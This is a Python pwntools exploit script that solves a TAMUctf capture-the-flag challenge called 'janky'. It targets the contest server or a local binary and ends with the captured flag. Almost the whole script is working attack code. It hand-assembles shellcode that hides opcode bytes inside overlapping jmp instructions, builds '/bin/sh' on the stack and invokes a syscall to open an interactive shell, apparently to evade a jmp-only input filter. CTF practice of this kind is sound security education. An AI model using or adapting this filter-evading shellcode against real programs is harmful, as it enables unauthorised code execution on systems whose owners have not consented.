#!/usr/bin/python3

from pwn import *

exe = ELF('janky_patched', checksec=False)
libc = ELF('libc.so.6', checksec=False)
context.binary = exe


def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''

                brva 0x403E7
                c
                ''')
        input()


def info(msg): return log.info(msg)
def sla(msg, data): return p.sendlineafter(msg, data)
def sa(msg, data): return p.sendafter(msg, data)
def sl(data): return p.sendline(data)
def s(data): return p.send(data)


if args.REMOTE:
    p = remote("tamuctf.com", 443, ssl=True, sni="janky")
else:
    p = process(exe.path)

pa = asm("""
            jmp  eeax + 3
            eeax:
                jmp [0x01043ab0]
            jmp  eesi + 3
            eesi:
                jmp [0xbe66]
            

            jmp p0 +3
            p0:
                jmp [0x006a006a]
            jmp rrdx +3
            rrdx:
                jmp [0x24148b48]


            jmp bbl+3
            bbl:
                jmp [0x012fbb66]
                
            jmp bbl1+3
            bbl1:
                jmp [0x08245c00]
            
            jmp cbl+3
            cbl:
                jmp [0x0162bb66]
                
            jmp cbl1+3
            cbl1:
                jmp [0x09245c00]
                
            jmp dbl+3
            dbl:
                jmp [0x0169bb66]
                
            jmp dbl1+3
            dbl1:
                jmp [0x0a245c00]
                
            jmp ebl+3
            ebl:
                jmp [0x016ebb66]
                
            jmp ebl1+3
            ebl1:
                jmp [0x0b245c00]
            
            jmp fbl+3
            fbl:
                jmp [0x012fbb66]
                
            jmp fbl1+3
            fbl1:
                jmp [0x0c245c00]
                
            
            jmp hbl+3
            hbl:
                jmp [0x0173bb66]
                
            jmp hbl1+3
            hbl1:
                jmp [0x0d245c00]
                
            jmp ibl+3
            ibl:
                jmp [0x0168bb66]
                
            jmp ibl1+3
            ibl1:
                jmp [0x0e245c00]
                
            jmp gbl+3
            gbl:
                jmp [0x0100bb66]
                
            jmp gbl1+3
            gbl1:
                jmp [0x0f245c00]
                
            jmp rrdi +3
            rrdi:
                jmp [0x53e78948]
            jmp rrdi8+3
            rrdi8:
                jmp [0x08c78366]
            jmp sys+3
            sys:
                jmp [0x050f050f]
                
              """)
GDB()

s(pa)
p.interactive()
# gigem{jump1ng_thr0ugh_h00p5}